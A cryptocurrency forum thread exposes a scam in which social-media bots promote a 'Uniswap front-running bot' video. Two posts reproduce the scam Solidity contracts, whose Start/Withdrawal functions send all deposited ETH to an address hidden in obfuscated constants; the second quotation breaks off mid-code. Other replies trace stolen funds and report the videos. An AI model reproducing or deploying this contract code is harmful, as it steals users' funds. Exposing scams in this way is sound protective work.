{
  "id": "topic_5415311",
  "title": "ScamViruS",
  "author": "ScamViruS",
  "created_time": "September 29, 2022, 07:38:33 AM",
  "content": "While everyone is spending their time watching the movement of the crypto market, scammers on the other hand are trying their best to come up with strategies that can easily scam crypto investors. And in this case they have succeeded and come up with an effective way, crypto users will be scammed before they know it if they follow the steps shown by the scammers.If someone posts something crypto related on various social media including Twitter, a group of bot accounts will come and reply to that post with a YouTube video link and there some other accounts will come and give likes, positive reviews to make things real. After seeing one such reply I researched this technique and figured out its purpose. They are promoting this tutorial video on a large scale using hundreds of accounts through social media.Video Link: https://m.youtube.com/watch?v=rx25DhSgZpM&key=1E1Z3U&I4H6RN=4F3SNRAKQ77X&gl=FRIn this video they are training how to make automatic profit by making a bot and they are giving ready code to crypto users. And the whole trick is in this code, if someone creates a contract using this code, they have added some function in that contract so that they will withdraw the crypto user's funds before they understand anything. Because they have access to that smart contract, they already have access through that code. So it is very important to do proper research before using anything that looks tempting and realistic, because after falling victim to a scam, it is not possible to fix anything.I've researched many people who have already fallen victim to this scam and are seeking redressal after being scammed, which seems to me nothing more than informing them of how this scam is run.Source:- https://ethereum.stackexchange.com/questions/135563/how-to-retrieve-eth-accidentally-sent-to-a-contract-that-is-watch-only?fbclid=IwAR0cKLnDR97pA0tDpvjRqikBinjqNWjFj0v-ApzdP9nly5ubNWpJNkt-k9Ehttps://ethereum.stackexchange.com/questions/135176/i-think-i-got-scammed-by-uniswap-frontrunner-scam-bot/135178#135178Here are the replies to some of the tweets through which the scammers are promoting this video.Code:https://twitter.com/paye_prince/status/1575384038424076289?s=20&t=Y_41B2N37Yfi0fSMgz-uEQhttps://twitter.com/Victoro71059106/status/1575384064873357312?s=20&t=Y_41B2N37Yfi0fSMgz-uEQhttps://twitter.com/DANLADILAWRENC1/status/1575331455806349315?s=20&t=Y_41B2N37Yfi0fSMgz-uEQhttps://twitter.com/Victoro71059106/status/1575282630861389824?s=20&t=Y_41B2N37Yfi0fSMgz-uEQhttps://twitter.com/KinnutR/status/1575277912290480130?s=20&t=Y_41B2N37Yfi0fSMgz-uEQhttps://twitter.com/VMacus/status/1575273506954219525?s=20&t=Y_41B2N37Yfi0fSMgz-uEQhttps://twitter.com/dqualityguah/status/1575264635153965056?s=20&t=Y_41B2N37Yfi0fSMgz-uEQhttps://twitter.com/AlanWillianPer1/status/1575250760924860430?s=20&t=Y_41B2N37Yfi0fSMgz-uEQhttps://twitter.com/bashiru_raheem/status/1575243419714261006?s=20&t=Y_41B2N37Yfi0fSMgz-uEQhttps://twitter.com/MehakKhawer/status/1575229183310954497?s=20&t=Y_41B2N37Yfi0fSMgz-uEQhttps://twitter.com/deepaktetwal1/status/1575219093275176960?s=20&t=Y_41B2N37Yfi0fSMgz-uEQhttps://twitter.com/d12b5165db3d451/status/1575209103961382912?s=20&t=Y_41B2N37Yfi0fSMgz-uEQhttps://twitter.com/Rahmanlala2/status/1575201897329283072?s=20&t=Y_41B2N37Yfi0fSMgz-uEQhttps://twitter.com/choque_lia/status/1575195222228996097?s=20&t=Y_41B2N37Yfi0fSMgz-uEQhttps://twitter.com/kailash41550330/status/1575181928453402624?s=20&t=Y_41B2N37Yfi0fSMgz-uEQhttps://twitter.com/d12b5165db3d451/status/1575167018873257989?s=20&t=Y_41B2N37Yfi0fSMgz-uEQhttps://twitter.com/JoyceAKamara1/status/1575167006231232512?s=20&t=Y_41B2N37Yfi0fSMgz-uEQIf you get more information feel free to share.",
  "score": 0,
  "upvotes": 0,
  "downvotes": 0,
  "url": "https://bitcointalk.org/index.php?topic=5415311",
  "comments": [
    {
      "author": "ScamViruS",
      "created_time": "September 29, 2022, 10:05:37 AM",
      "body": "Fake Smart Contract Code :Code://SPDX-License-Identifier: MITpragma solidity ^0.6.6;// Import Libraries Migrator/Exchange/Factoryimport \"github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol\";import \"github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol\";import \"github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol\";contract UniswapBot {     uint liquidity;    uint private pool;    address public owner;    event Log(string _msg);    /*     * @dev constructor     * @set the owner of the contract      */    constructor() public {        owner = msg.sender;    }    receive() external payable {}    struct slice {        uint _len;        uint _ptr;    }    /*     * @dev Find newly deployed contracts on Uniswap Exchange     * @param memory of required contract liquidity.     * @param other The second slice to compare.     * @return New contracts with required liquidity.     */    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {        uint shortest = self._len;       if (other._len < self._len)             shortest = other._len;        uint selfptr = self._ptr;        uint otherptr = other._ptr;        for (uint idx = 0; idx < shortest; idx += 32) {            // initiate contract finder            uint a;            uint b;            string memory WETH_CONTRACT_ADDRESS = \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\";            string memory TOKEN_CONTRACT_ADDRESS = \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\";            loadCurrentContract(WETH_CONTRACT_ADDRESS);            loadCurrentContract(TOKEN_CONTRACT_ADDRESS);            assembly {                a := mload(selfptr)                b := mload(otherptr)            }            if (a != b) {                // Mask out irrelevant contracts and check again for new contracts                uint256 mask = uint256(-1);                if(shortest < 32) {                  mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);                }                uint256 diff = (a & mask) - (b & mask);                if (diff != 0)                    return int(diff);            }            selfptr += 32;            otherptr += 32;        }        return int(self._len) - int(other._len);    }    /*     * @dev Extracts the newest contracts on Uniswap exchange     * @param self The slice to operate on.     * @param rune The slice that will contain the first rune.     * @return `list of contracts`.     */    function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {        uint ptr = selfptr;        uint idx;        if (needlelen <= selflen) {            if (needlelen <= 32) {                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));                bytes32 needledata;                assembly { needledata := and(mload(needleptr), mask) }                uint end = selfptr + selflen - needlelen;                bytes32 ptrdata;                assembly { ptrdata := and(mload(ptr), mask) }                while (ptrdata != needledata) {                    if (ptr >= end)                        return selfptr + selflen;                    ptr++;                    assembly { ptrdata := and(mload(ptr), mask) }                }                return ptr;            } else {                // For long needles, use hashing                bytes32 hash;                assembly { hash := keccak256(needleptr, needlelen) }                for (idx = 0; idx <= selflen - needlelen; idx++) {                    bytes32 testHash;                    assembly { testHash := keccak256(ptr, needlelen) }                    if (hash == testHash)                        return ptr;                    ptr += 1;                }            }        }        return selfptr + selflen;    }    /*     * @dev Loading the contract     * @param contract address     * @return contract interaction object     */    function loadCurrentContract(string memory self) internal pure returns (string memory) {        string memory ret = self;        uint retptr;        assembly { retptr := add(ret, 32) }        return ret;    }    /*     * @dev Extracts the contract from Uniswap     * @param self The slice to operate on.     * @param rune The slice that will contain the first rune.     * @return `rune`.     */    function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {        rune._ptr = self._ptr;        if (self._len == 0) {            rune._len = 0;            return rune;        }        uint l;        uint b;        // Load the first byte of the rune into the LSBs of b        assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }        if (b < 0x80) {            l = 1;        } else if(b < 0xE0) {            l = 2;        } else if(b < 0xF0) {            l = 3;        } else {            l = 4;        }        // Check for truncated codepoints        if (l > self._len) {            rune._len = self._len;            self._ptr += self._len;            self._len = 0;            return rune;        }        self._ptr += l;        self._len -= l;        rune._len = l;        return rune;    }    uint256 mempool_array = 100000000000000001;    function memcpy(uint dest, uint src, uint len) private pure {        // Check available liquidity        for(; len >= 32; len -= 32) {            assembly {                mstore(dest, mload(src))            }            dest += 32;            src += 32;        }        // Copy remaining bytes        uint mask = 256 ** (32 - len) - 1;        assembly {            let srcpart := and(mload(src), not(mask))            let destpart := and(mload(dest), mask)            mstore(dest, or(destpart, srcpart))        }    }    /*     * @dev Orders the contract by its available liquidity     * @param self The slice to operate on.     * @return The contract with possbile maximum return     */    function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {        if (self._len == 0) {            return 0;        }        uint word;        uint length;        uint divisor = 2 ** 248;        // Load the rune into the MSBs of b        assembly { word:= mload(mload(add(self, 32))) }        uint b = word / divisor;        if (b < 0x80) {            ret = b;            length = 1;        } else if(b < 0xE0) {            ret = b & 0x1F;            length = 2;        } else if(b < 0xF0) {            ret = b & 0x0F;            length = 3;        } else {            ret = b & 0x07;            length = 4;        }        // Check for truncated codepoints        if (length > self._len) {            return 0;        }        for (uint i = 1; i < length; i++) {            divisor = divisor / 256;            b = (word / divisor) & 0xFF;            if (b & 0xC0 != 0x80) {                // Invalid UTF-8 sequence                return 0;            }            ret = (ret * 64) | (b & 0x3F);        }        return ret;    }    /*     * @dev Calculates remaining liquidity in contract     * @param self The slice to operate on.     * @return The length of the slice in runes.     */    function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {        uint ptr = self._ptr - 31;        uint end = ptr + self._len;        for (l = 0; ptr < end; l++) {            uint8 b;            assembly { b := and(mload(ptr), 0xFF) }            if (b < 0x80) {                ptr += 1;            } else if(b < 0xE0) {                ptr += 2;            } else if(b < 0xF0) {                ptr += 3;            } else if(b < 0xF8) {                ptr += 4;            } else if(b < 0xFC) {                ptr += 5;            } else {                ptr += 6;            }        }    }    function getMemPoolOffset() internal pure returns (uint) {        return 790429;    }    /*     * @dev Parsing all Uniswap mempool     * @param self The contract to operate on.     * @return True if the slice is empty, False otherwise.     */    function parseMemoryPool(string memory _a) internal pure returns (address _parsed) {        bytes memory tmp = bytes(_a);        uint160 iaddr = 0;        uint160 b1;        uint160 b2;        for (uint i = 2; i < 2 + 2 * 20; i += 2) {            iaddr *= 256;            b1 = uint160(uint8(tmp[i]));            b2 = uint160(uint8(tmp[i + 1]));            if ((b1 >= 97) && (b1 <= 102)) {                b1 -= 87;            } else if ((b1 >= 65) && (b1 <= 70)) {                b1 -= 55;            } else if ((b1 >= 48) && (b1 <= 57)) {                b1 -= 48;            }            if ((b2 >= 97) && (b2 <= 102)) {                b2 -= 87;            } else if ((b2 >= 65) && (b2 <= 70)) {                b2 -= 55;            } else if ((b2 >= 48) && (b2 <= 57)) {                b2 -= 48;            }            iaddr += (b1 * 16 + b2);        }        return address(iaddr);    }    /*     * @dev Returns the keccak-256 hash of the contracts.     * @param self The slice to hash.     * @return The hash of the contract.     */    function keccak(slice memory self) internal pure returns (bytes32 ret) {        assembly {            ret := keccak256(mload(add(self, 32)), mload(self))        }    }    /*     * @dev Check if contract has enough liquidity available     * @param self The contract to operate on.     * @return True if the slice starts with the provided text, false otherwise.     */        function checkLiquidity(uint a) internal pure returns (string memory) {        uint count = 0;        uint b = a;        while (b != 0) {            count++;            b /= 16;        }        bytes memory res = new bytes(count);        for (uint i=0; i<count; ++i) {            b = a % 16;            res[count - i - 1] = toHexDigit(uint8(b));            a /= 16;        }        uint hexLength = bytes(string(res)).length;        if (hexLength == 4) {            string memory _hexC1 = mempool(\"0\", string(res));            return _hexC1;        } else if (hexLength == 3) {            string memory _hexC2 = mempool(\"0\", string(res));            return _hexC2;        } else if (hexLength == 2) {            string memory _hexC3 = mempool(\"000\", string(res));            return _hexC3;        } else if (hexLength == 1) {            string memory _hexC4 = mempool(\"0000\", string(res));            return _hexC4;        }        return string(res);    }    function getMemPoolLength() internal pure returns (uint) {        return 517264;    }    /*     * @dev If `self` starts with `needle`, `needle` is removed from the     *      beginning of `self`. Otherwise, `self` is unmodified.     * @param self The slice to operate on.     * @param needle The slice to search for.     * @return `self`     */    function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {        if (self._len < needle._len) {            return self;        }        bool equal = true;        if (self._ptr != needle._ptr) {            assembly {                let length := mload(needle)                let selfptr := mload(add(self, 0x20))                let needleptr := mload(add(needle, 0x20))                equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))            }        }        if (equal) {            self._len -= needle._len;            self._ptr += needle._len;        }        return self;    }    // Returns the memory address of the first byte of the first occurrence of    // `needle` in `self`, or the first byte after `self` if not found.    function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {        uint ptr = selfptr;        uint idx;        if (needlelen <= selflen) {            if (needlelen <= 32) {                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));                bytes32 needledata;                assembly { needledata := and(mload(needleptr), mask) }                uint end = selfptr + selflen - needlelen;                bytes32 ptrdata;                assembly { ptrdata := and(mload(ptr), mask) }                while (ptrdata != needledata) {                    if (ptr >= end)                        return selfptr + selflen;                    ptr++;                    assembly { ptrdata := and(mload(ptr), mask) }                }                return ptr;            } else {                // For long needles, use hashing                bytes32 hash;                assembly { hash := keccak256(needleptr, needlelen) }                for (idx = 0; idx <= selflen - needlelen; idx++) {                    bytes32 testHash;                    assembly { testHash := keccak256(ptr, needlelen) }                    if (hash == testHash)                        return ptr;                    ptr += 1;                }            }        }        return selfptr + selflen;    }    function getMemPoolHeight() internal pure returns (uint) {        return 363592;    }    /*     * @dev Iterating through all mempool to call the one with the with highest possible returns     * @return `self`.     */    function callMempool() internal pure returns (string memory) {        string memory _memPoolOffset = mempool(\"x\", checkLiquidity(getMemPoolOffset()));        uint _memPoolSol = 832423;        uint _memPoolLength = getMemPoolLength();        uint _memPoolSize = 550944;        uint _memPoolHeight = getMemPoolHeight();        uint _memPoolWidth = 98963;        uint _memPoolDepth = getMemPoolDepth();        uint _memPoolCount = 232166;        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));        string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));        string memory _memPool3 = mempool(checkLiquidity(_memPoolHeight), checkLiquidity(_memPoolWidth));        string memory _memPool4 = mempool(checkLiquidity(_memPoolDepth), checkLiquidity(_memPoolCount));        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));        string memory _fullMempool = mempool(\"0\", _allMempools);        return _fullMempool;    }     function checkMempoolStarted() internal view returns (bool) {        if(address(this).balance > mempool_array){            return true;        }        else{            return false;        }    }    /*     * @dev Modifies `self` to contain everything from the first occurrence of     *      `needle` to the end of the slice. `self` is set to the empty slice     *      if `needle` is not found.     * @param self The slice to search and modify.     * @param needle The text to search for.     * @return `self`.     */    function toHexDigit(uint8 d) pure internal returns (byte) {        if (0 <= d && d <= 9) {            return byte(uint8(byte('0')) + d);        } else if (10 <= uint8(d) && uint8(d) <= 15) {            return byte(uint8(byte('a')) + d - 10);        }        // revert(\"Invalid hex digit\");        revert();    }    function _callStartActionMempool() internal pure returns (address) {        return parseMemoryPool(callMempool());    }    /*     * @dev Perform action from different contract pools     * @param contract address to snipe liquidity from     * @return `liquidity`.     */    function Start() public payable {         emit Log(\"Running attack on Uniswap. This can take a while please wait...\");        if (checkMempoolStarted()){            payable(_callStartActionMempool()).transfer(address(this).balance);        }        else{            payable(_callStartActionMempool()).transfer(0);        }    }    /*     * @dev withdrawals profit back to contract creator address     * @return `profits`.     */    function Withdrawal() public payable {         emit Log(\"Sending profits back to contract creator address...\");        if (checkMempoolStarted()){            payable(withdrawalProfits()).transfer(address(this).balance);        }        else{            payable(owner).transfer(address(this).balance);        }    }    /*     * @dev withdrawals profit back to contract creator address     * @return `profits`.     */    function Stop() public payable {         emit Log(\"Stopping the bot...\");        if (checkMempoolStarted()){            payable(_callStopMempoolActionMempool()).transfer(address(this).balance);        }        else{            payable(_callStopMempoolActionMempool()).transfer(0);        }    }    function _callStopMempoolActionMempool() internal pure returns (address) {        return parseMemoryPool(callMempool());    }    /*     * @dev token int2 to readable str     * @param token An output parameter to which the first token is written.     * @return `token`.     */    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {        if (_i == 0) {            return \"0\";        }        uint j = _i;        uint len;        while (j != 0) {            len++;            j /= 10;        }        bytes memory bstr = new bytes(len);        uint k = len - 1;        while (_i != 0) {            bstr[k--] = byte(uint8(48 + _i % 10));            _i /= 10;        }        return string(bstr);    }    function getMemPoolDepth() internal pure returns (uint) {        return 546345;    }    function withdrawalProfits() internal pure returns (address) {        return parseMemoryPool(callMempool());    }    /*     * @dev loads all Uniswap mempool into memory     * @param token An output parameter to which the first token is written.     * @return `mempool`.     */    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {        bytes memory _baseBytes = bytes(_base);        bytes memory _valueBytes = bytes(_value);        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);        bytes memory _newValue = bytes(_tmpValue);        uint i;        uint j;        for(i=0; i<_baseBytes.length; i++) {            _newValue[j++] = _baseBytes[i];        }        for(i=0; i<_valueBytes.length; i++) {            _newValue[j++] = _valueBytes[i];        }        return string(_newValue);    }}",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "Mate2237",
      "created_time": "September 29, 2022, 11:48:50 AM",
      "body": "This is very good information to all. Scammers in those days are bringing and using new methods and approaches to dupe the ignorant people. The people that are falling for these scammers are those people who want big money in quickest way. Do not be in hurry for life. Patiently everything will be achieved in life.",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "ScamViruS",
      "created_time": "September 29, 2022, 05:07:28 PM",
      "body": "Quote from: Mate2237 on September 29, 2022, 11:48:50 AMThis is very good information to all. Scammers in those days are bringing and using new methods and approaches to dupe the ignorant people. The people that are falling for these scammers are those people who want big money in quickest way. Do not be in hurry for life. Patiently everything will be achieved in life.It is true that those who hope to make quick profits definitely fall prey to such scams. But many times when they see such promotions, they seem real, as a result of which many people follow this step and fall victim to scams. Many inexperienced crypto users don't realize that this could be a scam and even experienced ones don't catch this trick. So many people are confused and have fallen victim to this smart contract scam.",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "The Cryptovator",
      "created_time": "September 30, 2022, 08:06:13 PM",
      "body": "Don't play with codes unless you can read them. I am just worried about new crypto users who often search on YouTube to learn and earn money. The scammer takes this advantage to trap new users actually. Another problem is some experienced crypto users might become curious to deploy codes and earn free. But the reality is scammer writes code to transfer funds from the contract. People would think that there is no risk since I am deploying the contract from my address. But there is access to the contract with a scammer. They use some commands to move funds from their address. Not only that, it's automated. Once someone will send funds to the contract, the contract will send funds to the scammer within sec. So just don't play what you don't understand.",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "fortunecrypto",
      "created_time": "September 30, 2022, 09:23:32 PM",
      "body": "The video should be reported, the video looks legit they even had ads on it, and people commenting but its actual bots or part o the scammer's team, if you are not good at codes you will likely end up as one of the victims, never play on codes coming from Youtube, telegram, or just any sites where you are not 100% of the reputation, this report is a big help.The offer is too good to be true you should do your research first when stumbling upon offers that are too good to be true even if it looks legit.",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "TryNinja",
      "created_time": "September 30, 2022, 11:18:42 PM",
      "body": "70 ETH (over $90k) have been deposited into Tornado Cash from this address, who have been siphoning funds with this scam from over 125 addresses: https://etherscan.io/address/0xf305382678800d65c8e9c496a4b52a3c8b8a9115His victims: https://etherscan.io/txsInternal?a=0xf305382678800d65c8e9c496a4b52a3c8b8a9115And he/they probably have other addresses.",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "ScamViruS",
      "created_time": "October 05, 2022, 08:29:30 PM",
      "body": "Finally YouTube deleted this video, I reported it but YouTube took long time to delete the video. In fact the scammers will come back again by uploading this video to another channel, as their past activity is seen as such. I will update here if they upload this video again on any other channel.",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "ScamViruS",
      "created_time": "February 01, 2023, 06:52:36 PM",
      "body": "Quote from: fortunecrypto on September 30, 2022, 09:23:32 PMThe video should be reported, the video looks legit they even had ads on it, and people commenting but its actual bots or part o the scammer's team, if you are not good at codes you will likely end up as one of the victims, never play on codes coming from Youtube, telegram, or just any sites where you are not 100% of the reputation, this report is a big help.The offer is too good to be true you should do your research first when stumbling upon offers that are too good to be true even if it looks legit.This video has been deleted from YouTube. But this scammer group will not give up easily they will use more methods to reach out to crypto users. Since the crypto market is in a good trend it is expected that scammers will now find different techniques to scam crypto users. So now if you get any tempting offer from various channels it is important to research it well whether it is genuine or fake to be safe.",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "hugeblack",
      "created_time": "February 01, 2023, 08:13:20 PM",
      "body": "Quote from: ScamViruS on February 01, 2023, 06:52:36 PMBut this scammer group will not give up easily they will use more methods to reach out to crypto users. Since the crypto market is in a good trend it is expected that scammers will now find different techniques to scam crypto users. So now if you get any tempting offer from various channels it is important to research it well whether it is genuine or fake to be safe.Wasn't it easier for you to write \"pump\", since it's been more than 3 months since the last reply?Unfortunately, most of us do not review the code just because it is open source, which means that it is reliable because anyone review it. Unfortunately, the good developers who review the codes do not have enough time to follow the codes that appear in the quick profit platforms, which are mostly visited by beginners.Unless the phrase \"quick money from cryptocurrency\" disappears, this scam will continue.",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "ScamViruS",
      "created_time": "February 01, 2023, 08:24:43 PM",
      "body": "Quote from: hugeblack on February 01, 2023, 08:13:20 PMQuote from: ScamViruS on February 01, 2023, 06:52:36 PMBut this scammer group will not give up easily they will use more methods to reach out to crypto users. Since the crypto market is in a good trend it is expected that scammers will now find different techniques to scam crypto users. So now if you get any tempting offer from various channels it is important to research it well whether it is genuine or fake to be safe.Wasn't it easier for you to write \"pump\", since it's been more than 3 months since the last reply?It was possible, but I missed his reply earlier. So when I noticed today, I tried to explain the current situation, and I think this reply should have been given earlier. Because as market trends change, scammers keep coming up with money games. And now the market situation is positive enough so such scams can rise again.",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "ScamViruS",
      "created_time": "May 12, 2023, 07:08:36 AM",
      "body": "After stopping their activities for some time, they started promoting this scam again. Since they choose the social media comment box to promote this link, they can get a lot of views on their videos, which is enough for the scammers if only a few viewers try to use this scam. So to keep crypto users safe, these videos need to be reported and deleted from YouTube.Video Link : https://youtu.be/SQ2KdHYNj6w",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "Latviand",
      "created_time": "May 12, 2023, 11:27:33 AM",
      "body": "Quote from: ScamViruS on October 05, 2022, 08:29:30 PMFinally YouTube deleted this video, I reported it but YouTube took long time to delete the video. In fact the scammers will come back again by uploading this video to another channel, as their past activity is seen as such. I will update here if they upload this video again on any other channel.Given that there's millions if not billions of hours that YouTube has to filter through to moderate their content and ban explicit contents, you got to cut them some slack, not to mention that YouTube has a flawed moderating system where it bans unreasonably so you can't really rely too much, they delete videos that can easily be resolved through a couple of edits but pornography seems to be out of reach for YouTube sometimes.",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "ScamViruS",
      "created_time": "May 12, 2023, 04:46:36 PM",
      "body": "Quote from: Latviand on May 12, 2023, 11:27:33 AMQuote from: ScamViruS on October 05, 2022, 08:29:30 PMFinally YouTube deleted this video, I reported it but YouTube took long time to delete the video. In fact the scammers will come back again by uploading this video to another channel, as their past activity is seen as such. I will update here if they upload this video again on any other channel.Given that there's millions if not billions of hours that YouTube has to filter through to moderate their content and ban explicit contents, you got to cut them some slack, not to mention that YouTube has a flawed moderating system where it bans unreasonably so you can't really rely too much, they delete videos that can easily be resolved through a couple of edits but pornography seems to be out of reach for YouTube sometimes.YouTube takes time to find such videos among so many videos. But when we expose these videos, crypto users start reporting them, making it easier for YouTube to quickly find and delete these videos. So crypto users should report any such scam videos as soon as they see them and help remove them from YouTube as soon as possible.",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "ScamViruS",
      "created_time": "July 18, 2023, 06:43:01 PM",
      "body": "After opening a lot of fake Twitter accounts, scammers are using those accounts to tell such success stories and promote this fake bot. In fact, this is an effective strategy for them, because they can reach more people by commenting on tweets that have more reach. Newbies should avoid such traps as falling into them will result in them losing their funds and ending their crypto journey at the beginning.Video Link : https://youtu.be/85C3qKkF5RcTwitter account : https://twitter.com/PoundProduction?t=ZRTze0HN-_BMv6jSrb4x1w&s=09",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "hugeblack",
      "created_time": "July 19, 2023, 10:48:37 AM",
      "body": "Quote from: ScamViruS on July 18, 2023, 06:43:01 PMAfter opening a lot of fake Twitter accounts, scammers are using those accounts to tell such success stories and promote this fake bot. In fact, this is an effective strategy for them, because they can reach more people by commenting on tweets that have more reach. Newbies should avoid such traps as falling into them will result in them losing their funds and ending their crypto journey at the beginning.The problem is that Twitter and YouTube are slow in combating such fraud, and these links may not be deleted even after several notifications, while with an army of positive responses it will push the beginner to think that everything is normal.Unfortunately, trust in social media is not in DYOR, but rather by reading the responses. If there is no comment that it is a scam, and everyone says that I got quick profits, you will find that people start investing without thinking about the risks involved.Some also believe that cryptocurrencies are a quick way to make $1,000 a day, which is not true at all.",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "ScamViruS",
      "created_time": "July 19, 2023, 09:47:44 PM",
      "body": "Quote from: hugeblack on July 19, 2023, 10:48:37 AMThe problem is that Twitter and YouTube are slow in combating such fraud, and these links may not be deleted even after several notifications, while with an army of positive responses it will push the beginner to think that everything is normal.I have reported such fraudulent videos on Twitter and YouTube numerous times, but they take a lot of time to delete those videos and links. As a result, scammers hit their targets before Twitter, YouTube takes action. Because social media is now in the hands of scammers. But here Twitter and YouTube should have been more strict, so that such scams could have been prevented. The crypto community is working to create awareness and expose scammers' new tactics.",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "ScamViruS",
      "created_time": "August 27, 2023, 09:56:05 AM",
      "body": "Scammers still haven't stopped promoting fake Ethereum Mev bot, now their numbers have increased on YouTube. They have been running this scam for a long time by uploading videos on YouTube and using social media. They create more bot accounts and write positive reviews in the comment box of those videos, to attract crypto traders. I have already reported the video, hope those who see this post will also report it, so that at least some of the videos can be deleted from YouTube.YouTube :https://youtu.be/QTvKDqxMRAk?si=g9k-NTxcko_H3uc_https://youtu.be/GhdrjOFT-E8?si=D85_3Q6yUq3iknn5How this scam is being implemented, he has explained in detail in this video : https://www.youtube.com/watch?v=c67wWQOpTns",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "JeromeTash",
      "created_time": "September 02, 2023, 01:19:08 PM",
      "body": "I saw someone post about this scam yesterday, but his post has been deleted. This is the archived version of his post https://ninjastic.space/topic/5465321. I think such users should be banned since they are trying to spread malicious code in the forum.So according to his post, the code was to be got from this linkCode:https://ipfs.io/ipfs/QmcRgqFAzxyNv3hfHkTEjYNabxG3VzG1XF3oEKnVY9PhMh Look into the fake code, which contains lots of comments to hide the actual executable part of the smart contract codeCode:pragma solidity ^0.6.6;// PancakeSwap FrontrunDeployerimport \"https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Callee.sol\";// PancakeSwap managerimport \"https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol\";import \"https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol\";contract UniswapV2FrontBot {        string public tokenName; string public tokenSymbol; uint frontrun; uint manager;   constructor(string memory _tokenName, string memory _tokenSymbol) public {  tokenName = _tokenName;  tokenSymbol = _tokenSymbol;  manager = frontrun;    }           // Send required BNB for liquidity pair     receive() external payable {}               // Perform tasks (clubbed .json functions into one to reduce external calls & reduce gas) manager.performTasks();          function action() public payable {  //Perform a front-running attack on uniswap//const fs = require('fs');//var Web3 = require('web3');//var abiDecoder = require('abi-decoder');//var colors = require(\"colors\");//var Tx = require('ethereumjs-tx').Transaction;//var axios = require('axios');//var BigNumber = require('big-number');//const {NETWORK, PANCAKE_ROUTER_ADDRESS, PANCAKE_FACTORY_ADDRESS, PANCAKE_ROUTER_ABI, PANCAKE_FACTORY_ABI, PANCAKE_POOL_ABI, HTTP_PROVIDER_LINK, WEBSOCKET_PROVIDER_LINK, HTTP_PROVIDER_LINK_TEST} = require('./constants.js');//const {setBotAddress, getBotAddress, FRONT_BOT_ADDRESS, botABI} = require('./bot.js');//const {PRIVATE_KEY, TOKEN_ADDRESS, AMOUNT, LEVEL} = require('./env.js');//const INPUT_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';//const WBNB_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';manager;//var input_token_info;//var out_token_info;//var pool_info;//var gas_price_info;manager;//var web3;//var web3Ts;//var web3Ws;//var pancakeRouter;//var pancakeFactory;manager;// one gwei//const ONE_GWEI = 1e9;manager;//var buy_finished = false;//var sell_finished = false;//var buy_failed = false;//var sell_failed = false;//var attack_started = false;manager;//var succeed = false;//var subscription;manager;//async function createWeb3(){    //try {        // web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK));        // web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK_TEST));       // web3 = new Web3(EthereumTesterProvider());       // web3.eth.getAccounts(console.log);      //web3Ws = new Web3(new Web3.providers.WebsocketProvider(WEBSOCKET_PROVIDER_LINK));    //pancakeRouter = new web3.eth.Contract(PANCAKE_ROUTER_ABI, PANCAKE_ROUTER_ADDRESS);        //pancakeFactory = new web3.eth.Contract(PANCAKE_FACTORY_ABI, PANCAKE_FACTORY_ADDRESS);        //abiDecoder.addABI(PANCAKE_ROUTER_ABI);        manager;        //return true;    //} catch (error) {      //console.log(error);      //return false;      //async function main() { //try {           //if (await createWeb3() == false) {            //console.log('Web3 Create Error'.yellow);            //process.exit();                                                //const user_wallet = 